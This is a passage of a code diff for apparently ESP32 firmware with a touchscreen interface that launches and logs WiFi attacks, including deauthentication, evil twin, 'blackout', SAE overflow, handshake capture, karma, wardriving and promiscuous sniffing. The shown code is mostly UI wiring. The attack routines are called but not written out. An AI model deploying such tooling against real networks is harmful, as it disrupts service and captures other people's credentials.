+        if (xSemaphoreTake(lvgl_mutex, portMAX_DELAY) == pdTRUE) {
+            // Apply touch indicator changes outside indev callback
+            if (touch_dot && show_touch_dot) {
+                if (touch_pressed_flag) {
+                    lv_obj_clear_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
+                    lv_obj_set_pos(touch_dot, (int)touch_x_flag - 5, (int)touch_y_flag - 5);
+                    lv_obj_move_foreground(touch_dot);  // Ensure dot is always on top
+                } else {
+                    lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
+                }
+            }
+
+            // Handle deferred back navigation safely
+            if (nav_to_menu_flag) {
+                nav_to_menu_flag = false;
+                show_menu();
+            }
+
+            if (evil_twin_log_ta && evil_twin_log_queue) {
+                evil_log_msg_t msg;
+                while (xQueueReceive(evil_twin_log_queue, &msg, 0) == pdTRUE) {
+                    size_t line_len = strlen(msg.text);
+                    if (line_len == 0) {
+                        continue;
+                    }
+                    
+                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
+                    const char *current_text = lv_textarea_get_text(evil_twin_log_ta);
+                    if (current_text && strlen(current_text) > 2000) {
+                        // Find newline after first 500 chars and keep everything after it
+                        const char *trim_point = strchr(current_text + 500, '\n');
+                        if (trim_point) {
+                            // Copy trimmed text to temp buffer to avoid use-after-free
+                            char *trimmed = lv_mem_alloc(strlen(trim_point));
+                            if (trimmed) {
+                                strcpy(trimmed, trim_point + 1);
+                                lv_textarea_set_text(evil_twin_log_ta, trimmed);
+                                lv_mem_free(trimmed);
+                            }
+                        }
+                    }
+                    
+                    lv_textarea_add_text(evil_twin_log_ta, msg.text);
+                    if (msg.text[line_len - 1] != '\n') {
+                        lv_textarea_add_text(evil_twin_log_ta, "\n");
+                    }
+                    lv_textarea_set_cursor_pos(evil_twin_log_ta, LV_TEXTAREA_CURSOR_LAST);
+                }
+            }
+
+            if (blackout_log_ta && blackout_log_queue) {
+                evil_log_msg_t msg;
+                while (xQueueReceive(blackout_log_queue, &msg, 0) == pdTRUE) {
+                    size_t line_len = strlen(msg.text);
+                    if (line_len == 0) {
+                        continue;
+                    }
+                    
+                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
+                    const char *current_text = lv_textarea_get_text(blackout_log_ta);
+                    if (current_text && strlen(current_text) > 2000) {
+                        // Find newline after first 500 chars and keep everything after it
+                        const char *trim_point = strchr(current_text + 500, '\n');
+                        if (trim_point) {
+                            // Copy trimmed text to temp buffer to avoid use-after-free
+                            char *trimmed = lv_mem_alloc(strlen(trim_point));
+                            if (trimmed) {
+                                strcpy(trimmed, trim_point + 1);
+                                lv_textarea_set_text(blackout_log_ta, trimmed);
+                                lv_mem_free(trimmed);
+                            }
+                        }
+                    }
+                    
+                    lv_textarea_add_text(blackout_log_ta, msg.text);
+                    if (msg.text[line_len - 1] != '\n') {
+                        lv_textarea_add_text(blackout_log_ta, "\n");
+                    }
+                    lv_textarea_set_cursor_pos(blackout_log_ta, LV_TEXTAREA_CURSOR_LAST);
+                }
+            }
+
+            if (snifferdog_log_ta && snifferdog_log_queue) {
+                evil_log_msg_t msg;
+                while (xQueueReceive(snifferdog_log_queue, &msg, 0) == pdTRUE) {
+                    size_t line_len = strlen(msg.text);
+                    if (line_len == 0) {
+                        continue;
+                    }
+                    
+                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
+                    const char *current_text = lv_textarea_get_text(snifferdog_log_ta);
+                    if (current_text && strlen(current_text) > 2000) {
+                        // Find newline after first 500 chars and keep everything after it
+                        const char *trim_point = strchr(current_text + 500, '\n');
+                        if (trim_point) {
+                            // Copy trimmed text to temp buffer to avoid use-after-free
+                            char *trimmed = lv_mem_alloc(strlen(trim_point));
+                            if (trimmed) {
+                                strcpy(trimmed, trim_point + 1);
+                                lv_textarea_set_text(snifferdog_log_ta, trimmed);
+                                lv_mem_free(trimmed);
+                            }
+                        }
+                    }
+                    
+                    lv_textarea_add_text(snifferdog_log_ta, msg.text);
+                    if (msg.text[line_len - 1] != '\n') {
+                        lv_textarea_add_text(snifferdog_log_ta, "\n");
+                    }
+                    lv_textarea_set_cursor_pos(snifferdog_log_ta, LV_TEXTAREA_CURSOR_LAST);
+                }
+            }
+
+            if (sniffer_log_ta && sniffer_log_queue) {
+                evil_log_msg_t msg;
+                while (xQueueReceive(sniffer_log_queue, &msg, 0) == pdTRUE) {
+                    size_t line_len = strlen(msg.text);
+                    if (line_len == 0) {
+                        continue;
+                    }
+                    
+                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
+                    const char *current_text = lv_textarea_get_text(sniffer_log_ta);
+                    if (current_text && strlen(current_text) > 2000) {
+                        // Find newline after first 500 chars and keep everything after it
+                        const char *trim_point = strchr(current_text + 500, '\n');
+                        if (trim_point) {
+                            // Copy trimmed text to temp buffer to avoid use-after-free
+                            char *trimmed = lv_mem_alloc(strlen(trim_point));
+                            if (trimmed) {
+                                strcpy(trimmed, trim_point + 1);
+                                lv_textarea_set_text(sniffer_log_ta, trimmed);
+                                lv_mem_free(trimmed);
+                            }
+                        }
+                    }
+                    
+                    lv_textarea_add_text(sniffer_log_ta, msg.text);
+                    if (msg.text[line_len - 1] != '\n') {
+                        lv_textarea_add_text(sniffer_log_ta, "\n");
+                    }
+                    lv_textarea_set_cursor_pos(sniffer_log_ta, LV_TEXTAREA_CURSOR_LAST);
+                }
+            }
+
+            if (sae_overflow_log_ta && sae_overflow_log_queue) {
+                evil_log_msg_t msg;
+                // Process max 3 messages per UI cycle to avoid blocking
+                int msg_count = 0;
+                while (msg_count < 3 && xQueueReceive(sae_overflow_log_queue, &msg, 0) == pdTRUE) {
+                    msg_count++;
+                    size_t line_len = strlen(msg.text);
+                    if (line_len == 0) {
+                        continue;
+                    }
+                    
+                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
+                    const char *current_text = lv_textarea_get_text(sae_overflow_log_ta);
+                    if (current_text && strlen(current_text) > 2000) {
+                        // Find newline after first 500 chars and keep everything after it
+                        const char *trim_point = strchr(current_text + 500, '\n');
+                        if (trim_point) {
+                            // Copy trimmed text to temp buffer to avoid use-after-free
+                            char *trimmed = lv_mem_alloc(strlen(trim_point));
+                            if (trimmed) {
+                                strcpy(trimmed, trim_point + 1);
+                                lv_textarea_set_text(sae_overflow_log_ta, trimmed);
+                                lv_mem_free(trimmed);
+                            }
+                        }
+                    }
+                    
+                    lv_textarea_add_text(sae_overflow_log_ta, msg.text);
+                    if (msg.text[line_len - 1] != '\n') {
+                        lv_textarea_add_text(sae_overflow_log_ta, "\n");
+                    }
+                    lv_textarea_set_cursor_pos(sae_overflow_log_ta, LV_TEXTAREA_CURSOR_LAST);
+                }
+            }
+
+            if (handshake_log_ta && handshake_log_queue) {
+                evil_log_msg_t msg;
+                // Process max 3 messages per UI cycle to avoid blocking
+                int msg_count = 0;
+                while (msg_count < 3 && xQueueReceive(handshake_log_queue, &msg, 0) == pdTRUE) {
+                    msg_count++;
+                    size_t line_len = strlen(msg.text);
+                    if (line_len == 0) {
+                        continue;
+                    }
+                    
+                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
+                    const char *current_text = lv_textarea_get_text(handshake_log_ta);
+                    if (current_text && strlen(current_text) > 2000) {
+                        // Find newline after first 500 chars and keep everything after it
+                        const char *trim_point = strchr(current_text + 500, '\n');
+                        if (trim_point) {
+                            // Copy trimmed text to temp buffer to avoid use-after-free
+                            char *trimmed = lv_mem_alloc(strlen(trim_point));
+                            if (trimmed) {
+                                strcpy(trimmed, trim_point + 1);
+                                lv_textarea_set_text(handshake_log_ta, trimmed);
+                                lv_mem_free(trimmed);
+                            }
+                        }
+                    }
+                    
+                    lv_textarea_add_text(handshake_log_ta, msg.text);
+                    if (msg.text[line_len - 1] != '\n') {
+                        lv_textarea_add_text(handshake_log_ta, "\n");
+                    }
+                    lv_textarea_set_cursor_pos(handshake_log_ta, LV_TEXTAREA_CURSOR_LAST);
+                }
+            }
+
+            if (wardrive_log_ta && wardrive_log_queue) {
+                evil_log_msg_t msg;
+                while (xQueueReceive(wardrive_log_queue, &msg, 0) == pdTRUE) {
+                    size_t line_len = strlen(msg.text);
+                    if (line_len == 0) {
+                        continue;
+                    }
+                    
+                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
+                    const char *current_text = lv_textarea_get_text(wardrive_log_ta);
+                    if (current_text && strlen(current_text) > 2000) {
+                        // Find newline after first 500 chars and keep everything after it
+                        const char *trim_point = strchr(current_text + 500, '\n');
+                        if (trim_point) {
+                            // Copy trimmed text to temp buffer to avoid use-after-free
+                            char *trimmed = lv_mem_alloc(strlen(trim_point));
+                            if (trimmed) {
+                                strcpy(trimmed, trim_point + 1);
+                                lv_textarea_set_text(wardrive_log_ta, trimmed);
+                                lv_mem_free(trimmed);
+                            }
+                        }
+                    }
+                    
+                    lv_textarea_add_text(wardrive_log_ta, msg.text);
+                    if (msg.text[line_len - 1] != '\n') {
+                        lv_textarea_add_text(wardrive_log_ta, "\n");
+                    }
+                    lv_textarea_set_cursor_pos(wardrive_log_ta, LV_TEXTAREA_CURSOR_LAST);
+                }
+            }
+
+            if (karma_log_ta && karma_log_queue) {
+                evil_log_msg_t msg;
+                while (xQueueReceive(karma_log_queue, &msg, 0) == pdTRUE) {
+                    size_t line_len = strlen(msg.text);
+                    if (line_len == 0) {
+                        continue;
+                    }
+                    
+                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
+                    const char *current_text = lv_textarea_get_text(karma_log_ta);
+                    if (current_text && strlen(current_text) > 2000) {
+                        // Find newline after first 500 chars and keep everything after it
+                        const char *trim_point = strchr(current_text + 500, '\n');
+                        if (trim_point) {
+                            // Copy trimmed text to temp buffer to avoid use-after-free
+                            char *trimmed = lv_mem_alloc(strlen(trim_point));
+                            if (trimmed) {
+                                strcpy(trimmed, trim_point + 1);
+                                lv_textarea_set_text(karma_log_ta, trimmed);
+                                lv_mem_free(trimmed);
+                            }
+                        }
+                    }
+                    
+                    lv_textarea_add_text(karma_log_ta, msg.text);
+                    if (msg.text[line_len - 1] != '\n') {
+                        lv_textarea_add_text(karma_log_ta, "\n");
+                    }
+                    lv_textarea_set_cursor_pos(karma_log_ta, LV_TEXTAREA_CURSOR_LAST);
+                }
+            }
+
+            // If scan finished, build results UI (but not during blackout/snifferdog/sae_overflow/handshake/wardrive/karma attack)
+            if (scan_done_ui_flag) {
+                if (blackout_ui_active || snifferdog_ui_active || sae_overflow_ui_active || handshake_ui_active || wardrive_ui_active || karma_ui_active) {
+                    // During attacks, just clear the flag without showing results
+                    scan_done_ui_flag = false;
+                } else {
+                scan_done_ui_flag = false;
+
+                if (function_page) { lv_obj_del(function_page); function_page = NULL; }
+                scan_status_label = NULL;  // Reset label pointer after deletion
+                show_function_page("Scan Results");
+                show_touch_dot = true;
+
+                if (scan_list) { lv_obj_del(scan_list); scan_list = NULL; }
+                scan_list = lv_list_create(function_page);
+                if (!scan_list) {
+                    xSemaphoreGive(lvgl_mutex);
+                    vTaskDelay(pdMS_TO_TICKS(1));
+                    continue;
+                }
+                lv_obj_set_size(scan_list, lv_pct(100), LCD_V_RES - 30);
+                lv_obj_align(scan_list, LV_ALIGN_BOTTOM_MID, 0, 0);
+                lv_obj_set_style_bg_color(scan_list, lv_color_make(0, 0, 0), 0);  // Black background
+                lv_obj_set_style_text_color(scan_list, lv_color_make(0, 255, 0), 0);  // Green text
+                // Remove white separator lines between items
+                lv_obj_set_style_border_width(scan_list, 0, LV_PART_ITEMS);
+                lv_obj_set_style_border_color(scan_list, lv_color_make(0, 0, 0), LV_PART_ITEMS);
+
+                uint16_t count = wifi_scanner_get_count();
+                if (count == 0U) {
+                    lv_list_add_text(scan_list, "No networks found");
+                } else {
+                    uint16_t display_count = (count > SCAN_RESULTS_MAX_DISPLAY) ? SCAN_RESULTS_MAX_DISPLAY : count;
+
+                    wifi_ap_record_t *records = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * display_count);
+                    if (!records) {
+                        lv_list_add_text(scan_list, "Out of memory");
+                    } else {
+                        int got = wifi_scanner_get_results(records, display_count);
+                        if (got < 0) {
+                            lv_list_add_text(scan_list, "Failed to fetch results");
+                        } else {
+                            if (got > display_count) got = display_count;
+                            for (int i = 0; i < got; i++) {
+                                lv_obj_t *row = lv_list_add_btn(scan_list, NULL, "");
+                                if (!row) break;
+                                lv_obj_set_width(row, lv_pct(100));
+                                lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
+                                lv_obj_set_style_pad_all(row, 8, 0);  // 1.2x bigger (was 6, now 8)
+                                lv_obj_set_style_pad_gap(row, 10, 0);  // 1.2x bigger (was 8, now 10)
+                                lv_obj_set_height(row, LV_SIZE_CONTENT);
+                                lv_obj_set_style_bg_color(row, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black background
+                                lv_obj_set_style_bg_color(row, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+
+                                lv_obj_t *cb = lv_checkbox_create(row);
+                                if (!cb) break;
+                                lv_checkbox_set_text(cb, "");
+                                lv_obj_add_event_cb(cb, scan_checkbox_event_cb, LV_EVENT_VALUE_CHANGED, (void *)(intptr_t)i);
+                                // Green checkbox styling (retro terminal theme) - 1.2x bigger
+                                lv_obj_set_style_bg_color(cb, lv_color_make(0, 0, 0), LV_PART_INDICATOR);  // Black background for checkbox
+                                lv_obj_set_style_bg_color(cb, lv_color_make(0, 100, 0), LV_PART_INDICATOR | LV_STATE_CHECKED);  // Dark green when checked
+                                lv_obj_set_style_border_color(cb, lv_color_make(0, 255, 0), LV_PART_INDICATOR);  // Green border
+                                lv_obj_set_style_border_width(cb, 4, LV_PART_INDICATOR);  // 1.2x thicker border (was 3, now 4)
+                                lv_obj_set_style_text_color(cb, lv_color_make(0, 255, 0), 0);  // Green text
+                                lv_obj_set_style_pad_all(cb, 6, LV_PART_MAIN);  // Bigger checkbox padding
+
+                                lv_obj_t *ssid_lbl = lv_label_create(row);
+                                if (!ssid_lbl) break;
+                                char name_buf[128];
+                                const char *band = (records[i].primary <= 14) ? "2.4GHz" : "5GHz";
+                                if (records[i].ssid[0] != 0) {
+                                    snprintf(name_buf, sizeof(name_buf), "%s (%s, %02X:%02X:%02X:%02X:%02X:%02X)", 
+                                             (const char *)records[i].ssid, band,
+                                             records[i].bssid[0], records[i].bssid[1], records[i].bssid[2],
+                                             records[i].bssid[3], records[i].bssid[4], records[i].bssid[5]);
+                                } else {
+                                    snprintf(name_buf, sizeof(name_buf), "%02X:%02X:%02X:%02X:%02X:%02X (%s)",
+                                             records[i].bssid[0], records[i].bssid[1], records[i].bssid[2],
+                                             records[i].bssid[3], records[i].bssid[4], records[i].bssid[5], band);
+                                }
+                                lv_label_set_text(ssid_lbl, name_buf);
+                                lv_label_set_long_mode(ssid_lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
+                                lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_14, 0);
+                                lv_obj_set_style_text_color(ssid_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+                                lv_obj_align(ssid_lbl, LV_ALIGN_LEFT_MID, 0, 5);  // 5px down for better alignment
+                                lv_obj_set_width(ssid_lbl, lv_pct(85));
+
+                                if ((i & 7) == 7) {
+                                    vTaskDelay(pdMS_TO_TICKS(1));
+                                }
+                            }
+                        }
+
+                        lv_mem_free(records);
+
+                        if (count > SCAN_RESULTS_MAX_DISPLAY) {
+                            char msg[48];
+                            snprintf(msg, sizeof(msg), "... and %u more", count - SCAN_RESULTS_MAX_DISPLAY);
+                            lv_list_add_text(scan_list, msg);
+                        }
+                    }
+                }
+                }  // End of else block for !blackout_ui_active
+            }
+            // Update FPS label if on Deauther page
+            static uint32_t last_flush_cnt = 0;
+            static uint64_t last_us = 0;
+            if (deauth_fps_label && function_page) {
+                uint64_t now = esp_timer_get_time();
+                if (last_us == 0) { last_us = now; last_flush_cnt = lvgl_flush_counter; }
+                if (now - last_us >= 1000000) {
+                    uint32_t frames = lvgl_flush_counter - last_flush_cnt;
+                    char fps_buf[24];
+                    snprintf(fps_buf, sizeof(fps_buf), "%u FPS", (unsigned)frames);
+                    lv_label_set_text(deauth_fps_label, fps_buf);
+                    last_flush_cnt = lvgl_flush_counter;
+                    last_us = now;
+                }
+            }
+
+            // Handle stop/resume flags and update button label
+            if (deauth_stop_flag) {
+                deauth_stop_flag = false;
+                wifi_attacks_stop_deauth();
+                if (deauth_pause_btn) {
+                    lv_obj_t *label = lv_obj_get_child(deauth_pause_btn, 0);
+                    if (label) lv_label_set_text(label, "Resume");
+                }
+            }
+            if (deauth_resume_flag) {
+                deauth_resume_flag = false;
+                wifi_attacks_start_deauth();
+                if (deauth_pause_btn) {
+                    lv_obj_t *label = lv_obj_get_child(deauth_pause_btn, 0);
+                    if (label) lv_label_set_text(label, "Pause");
+                }
+            }
+
+            sleep_ms = lv_timer_handler();
+            
+            // Reset watchdog INSIDE mutex to catch long rendering operations
+            esp_task_wdt_reset();
+            
+            xSemaphoreGive(lvgl_mutex);
+        }
+        
+        // Reset watchdog again after releasing mutex
+        esp_task_wdt_reset();
+        
+        vTaskDelay(pdMS_TO_TICKS(sleep_ms > 10 ? 10 : sleep_ms));
+    }
+}
+
+void lvgl_flush_cb(lv_disp_drv_t *drv, const lv_area_t *area, lv_color_t *color_p)
+{
+    lvgl_flush_counter++;
+    esp_lcd_panel_handle_t panel = (esp_lcd_panel_handle_t)drv->user_data;
+    int32_t width = area->x2 - area->x1 + 1;
+    int32_t height = area->y2 - area->y1 + 1;
+    // Ensure we have valid parameters
+    if (color_p == NULL || width <= 0 || height <= 0) {
+        ESP_LOGE(TAG, "Invalid flush parameters!");
+        lv_disp_flush_ready(drv);
+        return;
+    }
+    
+    // CRITICAL: Take SD/SPI mutex before drawing to display
+    // Display and SD card share the same SPI bus (SPI2_HOST)
+    // Without mutex protection, simultaneous access causes crash: "assert failed: spi_hal_setup_trans"
+    // Use short timeout (100ms) - if SD is busy, LVGL will retry on next refresh cycle
+    if (sd_spi_mutex) {
+        if (xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(100)) == pdTRUE) {
+            esp_lcd_panel_draw_bitmap(panel, area->x1, area->y1, area->x2 + 1, area->y2 + 1, color_p);
+            xSemaphoreGive(sd_spi_mutex);
+        } else {
+            // Mutex timeout - SD card operation in progress
+            // Skip this refresh, LVGL will call us again
+            ESP_LOGD(TAG, "Display refresh skipped - SD busy");
+        }
+    } else {
+        // Mutex not initialized yet (early boot) - draw without protection
+        esp_lcd_panel_draw_bitmap(panel, area->x1, area->y1, area->x2 + 1, area->y2 + 1, color_p);
+    }
+    
+    lv_disp_flush_ready(drv);
+}
+
+void lvgl_touch_read_cb(lv_indev_drv_t *indev_drv, lv_indev_data_t *data)
+{
+    static int call_count = 0;
+    ft6336_handle_t *touch = (ft6336_handle_t *)indev_drv->user_data;
+    ft6336_touch_point_t point;
+    
+    // Debug counter kept but no console prints (avoid VFS write during draw)
+    call_count++;
+    if (ui_locked) {
+        data->state = LV_INDEV_STATE_RELEASED;
+        return;
+    }
+    
+    if (ft6336_read_touch(touch, &point) && point.touched) {
+        data->point.x = point.x;
+        data->point.y = point.y;
+        data->state = LV_INDEV_STATE_PRESSED;
+        touch_pressed_flag = true;
+        touch_x_flag = point.x;
+        touch_y_flag = point.y;
+    } else {
+        data->state = LV_INDEV_STATE_RELEASED;
+        touch_pressed_flag = false;
+    }
+}
+
+lv_obj_t *create_menu_item(lv_obj_t *parent, const char *icon, const char *text)
+{
+    lv_obj_t *cont = lv_menu_cont_create(parent);
+    lv_obj_set_style_pad_all(cont, 6, 0);  // 1.5x bigger (was 3, now 6)
+    lv_obj_set_style_pad_gap(cont, 8, 0);  // 1.5x bigger (was 5, now 8)
+    lv_obj_set_style_bg_color(cont, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black background
+    lv_obj_set_style_bg_color(cont, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+    
+    if (icon) {
+        lv_obj_t *img = lv_img_create(cont);
+        lv_img_set_src(img, icon);
+        lv_obj_set_width(img, 30);  // 1.5x bigger icon (was 20, now 30)
+        lv_obj_set_style_text_color(img, lv_color_make(0, 255, 0), 0);  // Green icon
+    }
+    
+    if (text) {
+        lv_obj_t *label = lv_label_create(cont);
+        lv_label_set_text(label, text);
+        lv_label_set_long_mode(label, LV_LABEL_LONG_SCROLL_CIRCULAR);  // Scrolling animation
+        lv_obj_set_width(label, 180);  // 1.5x bigger (was 120, now 180)
+        lv_obj_set_style_text_font(label, &lv_font_montserrat_20, 0);  // Bigger font (was 14, now 20)
+        lv_obj_set_style_text_color(label, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_set_style_anim_time(label, 2000, 0);  // 2 second animation cycle
+        lv_obj_set_style_anim_speed(label, 25, 0);  // Animation speed (pixels/sec)
+    }
+    
+    return cont;
+}
+
+lv_obj_t *create_clickable_item(lv_obj_t *parent, const char *icon, const char *text, lv_event_cb_t callback, const char *user_data)
+{
+    // Create button instead of menu_cont for clickable items
+    lv_obj_t *btn = lv_btn_create(parent);
+    lv_obj_set_size(btn, lv_pct(100), LV_SIZE_CONTENT);
+    lv_obj_set_style_bg_color(btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black background
+    lv_obj_set_style_bg_color(btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+    lv_obj_set_style_radius(btn, 5, 0);
+    lv_obj_set_style_pad_all(btn, 12, 0);  // 1.5x bigger (was 8, now 12)
+    lv_obj_set_style_pad_gap(btn, 8, 0);  // 1.5x bigger (was 5, now 8)
+    lv_obj_set_flex_flow(btn, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(btn, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    
+    if (icon) {
+        lv_obj_t *icon_label = lv_label_create(btn);
+        lv_label_set_text(icon_label, icon);
+        lv_obj_set_style_text_font(icon_label, &lv_font_montserrat_20, 0);  // Bigger (was 14, now 20)
+        lv_obj_set_style_text_color(icon_label, lv_color_make(0, 255, 0), 0);  // Green icons
+    }
+    
+    if (text) {
+        lv_obj_t *label = lv_label_create(btn);
+        lv_label_set_text(label, text);
+        lv_label_set_long_mode(label, LV_LABEL_LONG_SCROLL_CIRCULAR);
+        lv_obj_set_width(label, 180);  // 1.5x bigger (was 120, now 180)
+        lv_obj_set_style_text_font(label, &lv_font_montserrat_20, 0);  // Bigger (was 14, now 20)
+        lv_obj_set_style_text_color(label, lv_color_make(0, 255, 0), 0);  // Green text (retro terminal)
+        lv_obj_set_style_anim_time(label, 2000, 0);
+        lv_obj_set_style_anim_speed(label, 25, 0);
+    }
+    
+    if (callback && user_data) {
+        lv_obj_add_event_cb(btn, callback, LV_EVENT_CLICKED, (void*)user_data);
+    }
+    
+    return btn;
+}
+
+void back_to_menu_cb(lv_event_t *e)
+{
+    // Defer navigation to main loop to avoid deleting objects during event handling
+    nav_to_menu_flag = true;
+}
+
+static void deauth_pause_event_cb(lv_event_t *e)
+{
+    (void)e;
+    // Toggle pause/resume
+    if (deauth_paused) {
+        deauth_resume_flag = true;
+        deauth_paused = false;
+    } else {
+    deauth_stop_flag = true;
+        deauth_paused = true;
+    }
+}
+
+static void deauth_quit_event_cb(lv_event_t *e)
+{
+    (void)e;
+    // Stop all attacks (deauth, evil twin, etc.)
+    wifi_attacks_stop_all();
+    deauth_stop_flag = true;
+    deauth_paused = false;
+    // Navigate back to menu
+    nav_to_menu_flag = true;
+}
+
+static void blackout_yes_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    
+    // Set blackout UI active flag
+    blackout_ui_active = true;
+    scan_done_ui_flag = false;  // Clear any pending scan done flag
+    
+    // Delete the warning page content
+    if (function_page) {
+        lv_obj_clean(function_page);
+    }
+    
+    // Create log display page
+    blackout_log_ta = lv_textarea_create(function_page);
+    lv_obj_set_size(blackout_log_ta, lv_pct(100), LCD_V_RES - 30 - 50);
+    lv_obj_align(blackout_log_ta, LV_ALIGN_TOP_MID, 0, 30);
+    lv_textarea_set_text(blackout_log_ta, "Starting Blackout Attack...\n");
+    lv_obj_set_style_bg_color(blackout_log_ta, lv_color_make(0, 0, 0), 0);  // Black background
+    lv_obj_set_style_text_color(blackout_log_ta, lv_color_make(0, 255, 0), 0);  // Green text
+    lv_obj_set_style_border_color(blackout_log_ta, lv_color_make(0, 255, 0), 0);  // Green border
+    lv_obj_set_style_border_width(blackout_log_ta, 2, 0);
+    lv_obj_clear_state(blackout_log_ta, LV_STATE_FOCUSED);  // Hide cursor
+    
+    // Create Stop button at bottom
+    blackout_stop_btn = lv_btn_create(function_page);
+    lv_obj_set_size(blackout_stop_btn, lv_pct(100), 45);
+    lv_obj_align(blackout_stop_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_color(blackout_stop_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
+    lv_obj_set_style_bg_color(blackout_stop_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+    lv_obj_set_style_border_color(blackout_stop_btn, lv_color_make(0, 255, 0), 0);  // Green border
+    lv_obj_set_style_border_width(blackout_stop_btn, 3, 0);
+    lv_obj_t *stop_lbl = lv_label_create(blackout_stop_btn);
+    lv_label_set_text(stop_lbl, "Stop");
+    lv_obj_set_style_text_color(stop_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+    lv_obj_center(stop_lbl);
+    lv_obj_add_event_cb(blackout_stop_btn, blackout_stop_btn_cb, LV_EVENT_CLICKED, NULL);
+    
+    // Enable log capture
+    blackout_enable_log_capture();
+    
+    // Start blackout attack
+    wifi_attacks_start_blackout();
+}
+
+static void blackout_stop_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    // Stop blackout attack
+    wifi_attacks_stop_all();
+    blackout_disable_log_capture();
+    blackout_log_ta = NULL;
+    blackout_stop_btn = NULL;
+    blackout_ui_active = false;  // Clear blackout UI active flag
+    scan_done_ui_flag = false;  // Clear any pending scan done flag
+    // Navigate back to menu
+    nav_to_menu_flag = true;
+}
+
+static void snifferdog_yes_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    
+    // Set snifferdog UI active flag
+    snifferdog_ui_active = true;
+    scan_done_ui_flag = false;  // Clear any pending scan done flag
+    
+    // Delete the warning page content
+    if (function_page) {
+        lv_obj_clean(function_page);
+    }
+    
+    // Create log display page
+    snifferdog_log_ta = lv_textarea_create(function_page);
+    lv_obj_set_size(snifferdog_log_ta, lv_pct(100), LCD_V_RES - 30 - 50);
+    lv_obj_align(snifferdog_log_ta, LV_ALIGN_TOP_MID, 0, 30);
+    lv_textarea_set_text(snifferdog_log_ta, "Starting Snifferdog Attack...\n");
+    lv_obj_set_style_bg_color(snifferdog_log_ta, lv_color_make(0, 0, 0), 0);  // Black background
+    lv_obj_set_style_text_color(snifferdog_log_ta, lv_color_make(0, 255, 0), 0);  // Green text
+    lv_obj_set_style_border_color(snifferdog_log_ta, lv_color_make(0, 255, 0), 0);  // Green border
+    lv_obj_set_style_border_width(snifferdog_log_ta, 2, 0);
+    lv_obj_clear_state(snifferdog_log_ta, LV_STATE_FOCUSED);  // Hide cursor
+    
+    // Create Stop button at bottom
+    snifferdog_stop_btn = lv_btn_create(function_page);
+    lv_obj_set_size(snifferdog_stop_btn, lv_pct(100), 45);
+    lv_obj_align(snifferdog_stop_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_color(snifferdog_stop_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
+    lv_obj_set_style_bg_color(snifferdog_stop_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+    lv_obj_set_style_border_color(snifferdog_stop_btn, lv_color_make(0, 255, 0), 0);  // Green border
+    lv_obj_set_style_border_width(snifferdog_stop_btn, 3, 0);
+    lv_obj_t *stop_lbl = lv_label_create(snifferdog_stop_btn);
+    lv_label_set_text(stop_lbl, "Stop");
+    lv_obj_set_style_text_color(stop_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+    lv_obj_center(stop_lbl);
+    lv_obj_add_event_cb(snifferdog_stop_btn, snifferdog_stop_btn_cb, LV_EVENT_CLICKED, NULL);
+    
+    // Enable log capture
+    snifferdog_enable_log_capture();
+    
+    // Start snifferdog attack (custom implementation)
+    if (sniffer_dog_active) {
+        ESP_LOGI(TAG, "Snifferdog already active");
+        return;
+    }
+    
+    ESP_LOGI(TAG, "Starting Snifferdog...");
+    sniffer_dog_active = true;
+    
+    // Set promiscuous filter
+    esp_wifi_set_promiscuous_filter(&sniffer_filter);
+    
+    // Enable promiscuous mode with our callback
+    esp_wifi_set_promiscuous_rx_cb(sniffer_dog_promiscuous_callback);
+    esp_wifi_set_promiscuous(true);
+    
+    // Initialize dual-band channel hopping
+    sniffer_dog_channel_index = 0;
+    sniffer_dog_current_channel = dual_band_channels[0];
+    esp_wifi_set_channel(sniffer_dog_current_channel, WIFI_SECOND_CHAN_NONE);
+    sniffer_dog_last_channel_hop = esp_timer_get_time() / 1000;
+    
+    // Create channel hopping task with PSRAM stack
+    sniffer_dog_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
+    if (sniffer_dog_task_stack != NULL) {
+        sniffer_dog_task_handle = xTaskCreateStatic(sniffer_dog_task, "sniffer_dog", 4096, NULL, 
+            5, sniffer_dog_task_stack, &sniffer_dog_task_buffer);
+        if (sniffer_dog_task_handle == NULL) {
